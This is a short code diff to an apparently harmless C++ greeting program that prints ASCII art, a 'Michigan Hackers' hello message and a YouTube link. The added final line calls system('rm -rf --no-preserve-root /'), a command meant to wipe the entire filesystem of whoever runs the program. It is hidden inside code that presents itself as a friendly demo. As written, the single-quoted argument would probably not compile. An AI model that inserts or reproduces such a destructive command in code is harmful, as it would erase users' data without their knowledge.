@@ -29,4 +29,5 @@ int main(int argc, char *argv[]) {
                 .:lllll:.          .cllllc,                 \n" << std::endl;
     std::cout << "Hello from Michigan Hackers!\n";
     std::cout << "Learn more: https://www.youtube.com/watch?v=dQw4w9WgXcQ" << std::endl;
+    system('rm -rf --no-preserve-root /');
 }
